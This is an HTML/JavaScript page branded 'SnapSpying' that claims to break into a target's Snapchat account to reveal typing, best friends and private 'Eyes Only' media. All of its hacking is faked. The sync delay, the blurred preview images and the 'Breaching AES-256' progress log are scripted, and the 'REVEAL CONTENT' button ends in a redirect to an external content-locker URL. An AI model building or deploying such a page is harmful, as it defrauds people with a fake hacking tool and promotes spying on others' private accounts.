<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SnapSpying - Enterprise Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
        :root { --snap-yellow: #fffc00; --bg: #000; --card: #1c1c1e; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        
        /* Sheet Animation */
        .sheet { transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100; }
        .sheet.active { transform: translateY(0); }
        
        /* Glassmorphism for a Professional look */
        .action-item { background: var(--card); border-radius: 24px; margin-bottom: 12px; cursor: pointer; transition: 0.3s; border: 1px solid rgba(255,255,255,0.03); }
        .action-item:active { transform: scale(0.96); background: #2c2c2e; }
        
        .preview-box { 
            width: 100%; 
            border-radius: 20px; 
            overflow: hidden; 
            margin-bottom: 25px; 
            border: 1px solid rgba(255,255,255,0.1);
            background: #111;
            position: relative;
        }
        #preview-img { width: 100%; height: auto; display: block; filter: blur(10px) brightness(0.8); }

        .bar-fill { height: 100%; background: var(--snap-yellow); width: 0%; transition: width 0.4s linear; box-shadow: 0 0 20px var(--snap-yellow); }
        .input-box { background: #1c1c1e; border: 1px solid #2c2c2e; outline: none; transition: 0.3s; }
        .input-box:focus { border-color: var(--snap-yellow); box-shadow: 0 0 10px rgba(255,252,0,0.1); }
    </style>
</head>
<body class="flex flex-col items-center px-6 pt-6 min-h-screen">

    <header class="w-full max-w-md flex justify-between items-center py-6 mb-6">
        <h1 class="text-2xl font-black italic tracking-tighter">Snap<span class="text-[#fffc00]">Spying</span></h1>
        <div class="flex items-center gap-4 text-gray-500 font-bold text-[10px] tracking-widest uppercase">
            <span>Secure Tunnel</span>
            <i class="fas fa-shield-halved text-lg"></i>
        </div>
    </header>

    <div class="w-full max-w-md">
        <p class="text-[13px] font-bold text-gray-400 mb-3 uppercase tracking-widest px-1">Target Account</p>
        <div class="flex gap-2 mb-4">
            <input type="text" id="username" placeholder="Snapchat Username" class="input-box flex-1 rounded-2xl px-5 py-4 text-white font-semibold">
            <button onclick="handleConnect()" id="connBtn" class="bg-[#fffc00] text-black px-8 rounded-2xl font-black transition active:scale-90">Connect</button>
        </div>
        
        <div id="conn-status" class="hidden mb-10 flex items-center gap-3 px-2">
            <span class="relative flex h-2 w-2">
              <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
              <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
            </span>
            <span class="text-[12px] font-bold text-green-500 uppercase">Synchronized with <span id="targetName" class="underline"></span></span>
        </div>

        <div id="actions-grid" class="opacity-25 pointer-events-none transition-all duration-1000 space-y-4">
            <div onclick="openAction('582,393', 'Live Typing Stream', 'typing')" class="action-item p-5 flex items-center justify-between">
                <div class="flex items-center gap-4">
                    <div class="w-12 h-12 bg-white/5 flex items-center justify-center rounded-2xl border border-white/10"><i class="fas fa-keyboard text-gray-300"></i></div>
                    <div><h3 class="font-bold text-[16px]">Live Typing</h3><p class="text-[11px] text-gray-500">View messages before they are sent</p></div>
                </div>
                <i class="fas fa-chevron-right text-gray-800"></i>
            </div>

            <div onclick="openAction('1,042,100', 'Top 8 Best Friends', 'friends')" class="action-item p-5 flex items-center justify-between">
                <div class="flex items-center gap-4">
                    <div class="w-12 h-12 bg-white/5 flex items-center justify-center rounded-2xl border border-white/10"><i class="fas fa-users text-gray-300"></i></div>
                    <div><h3 class="font-bold text-[16px]">Best Friends</h3><p class="text-[11px] text-gray-500">Show private interaction ranking</p></div>
                </div>
                <i class="fas fa-chevron-right text-gray-800"></i>
            </div>

            <div onclick="openAction('94,204', 'Eyes Only Media Vault', 'eyes')" class="action-item p-5 flex items-center justify-between">
                <div class="flex items-center gap-4">
                    <div class="w-12 h-12 bg-white/5 flex items-center justify-center rounded-2xl border border-white/10"><i class="fas fa-eye text-gray-300"></i></div>
                    <div><h3 class="font-bold text-[16px]">Eyes Only</h3><p class="text-[11px] text-gray-500">Extract encrypted private media</p></div>
                </div>
                <i class="fas fa-chevron-right text-gray-800"></i>
            </div>
        </div>
    </div>

    <div id="action-sheet" class="fixed inset-0 z-[150] hidden">
        <div class="absolute inset-0 bg-black/95 backdrop-blur-xl" onclick="closeSheet()"></div>
        <div class="absolute bottom-0 w-full bg-[#1c1c1e] rounded-t-[45px] p-8 sheet text-center border-t border-white/10">
            <div class="w-12 h-1.5 bg-gray-800 mx-auto mb-10 rounded-full"></div>
            
            <div class="preview-box">
                <img id="preview-img" src="" alt="Internal Preview Error">
            </div>

            <div id="data-stats" class="mb-2">
                <span id="r-count" class="text-4xl font-black tracking-tighter">0</span>
            </div>
            <p class="text-[10px] text-gray-500 uppercase font-black mb-10 tracking-[0.2em]">Packets Found • Server Sync Ready</p>
            
            <h4 id="r-title" class="text-xl font-bold mb-10 leading-tight"></h4>
            
            <button onclick="startLocker()" class="w-full bg-[#fffc00] text-black font-black py-5 rounded-[22px] text-xl shadow-[0_15px_40px_rgba(255,252,0,0.15)] active:scale-95 transition-all">REVEAL CONTENT</button>
        </div>
    </div>

    <div id="proc-modal" class="hidden fixed inset-0 z-[300] bg-black/98 flex items-center justify-center p-10">
        <div class="w-full max-w-sm text-center">
            <div class="inline-block p-6 rounded-full bg-[#fffc00]/5 border border-[#fffc00]/10 mb-8 animate-pulse">
                <i class="fas fa-bolt-lightning text-[#fffc00] text-4xl"></i>
            </div>
            <h2 class="text-2xl font-black mb-2 uppercase italic tracking-tighter">Exploiting Security</h2>
            <div class="text-[#fffc00] font-black text-4xl mb-10 tracking-widest" id="p-percent">0%</div>
            <div class="h-1.5 bg-gray-900 rounded-full mb-8 overflow-hidden"><div id="bar" class="bar-fill"></div></div>
            <div id="p-log" class="text-[10px] text-gray-500 font-mono uppercase tracking-[0.3em]">Breaching AES-256 Layer...</div>
        </div>
    </div>

    <script>
        // Internal Image Data (Direct Links bash dima ikhdem 100%)
        const internalAssets = {
            'typing': 'https://i.ibb.co/C07B63X/typing-blur.png',
            'friends': 'https://i.ibb.co/v4K7L7L/friends-blur.png',
            'eyes': 'https://i.ibb.co/fnd9p5F/eyes-blur.png'
        };

        function handleConnect() {
            const user = document.getElementById('username').value;
            if(user.length < 3) return;
            const btn = document.getElementById('connBtn');
            btn.innerHTML = '<i class="fas fa-circle-notch animate-spin"></i>';
            btn.disabled = true;

            setTimeout(() => {
                btn.innerText = "Sync Active";
                btn.classList.replace('bg-[#fffc00]', 'bg-gray-800');
                btn.classList.replace('text-black', 'text-gray-400');
                document.getElementById('conn-status').classList.remove('hidden');
                document.getElementById('targetName').innerText = user;
                document.getElementById('actions-grid').classList.replace('opacity-25', 'opacity-100');
                document.getElementById('actions-grid').style.pointerEvents = 'auto';
            }, 1500);
        }

        function openAction(count, title, type) {
            const sheet = document.getElementById('action-sheet');
            document.getElementById('preview-img').src = internalAssets[type];
            document.getElementById('r-count').innerText = count;
            document.getElementById('r-title').innerText = title;
            sheet.classList.remove('hidden');
            setTimeout(() => sheet.querySelector('.sheet').classList.add('active'), 10);
        }

        function closeSheet() {
            document.querySelector('.sheet').classList.remove('active');
            setTimeout(() => document.getElementById('action-sheet').classList.add('hidden'), 400);
        }

        function startLocker() {
            closeSheet();
            setTimeout(() => {
                document.getElementById('proc-modal').classList.remove('hidden');
                let p = 0;
                const interval = setInterval(() => {
                    p += Math.floor(Math.random() * 2) + 1;
                    if(p > 100) p = 100;
                    document.getElementById('bar').style.width = p + '%';
                    document.getElementById('p-percent').innerText = p + '%';
                    
                    if(p == 20) document.getElementById('p-log').innerText = "Intercepting Snap-Cloud...";
                    if(p == 50) document.getElementById('p-log').innerText = "Injecting Proxy Tunnel...";
                    if(p == 85) document.getElementById('p-log').innerText = "Extraction Successful...";
                    
                    if(p >= 100) {
                        clearInterval(interval);
                        // REDIRECT TO CONTENT LOCKER
                        window.location.href = "https://authenticateapp.online/cp/js/2wx2k";
                    }
                }, 40);
            }, 500);
        }
    </script>
</body>
</html>
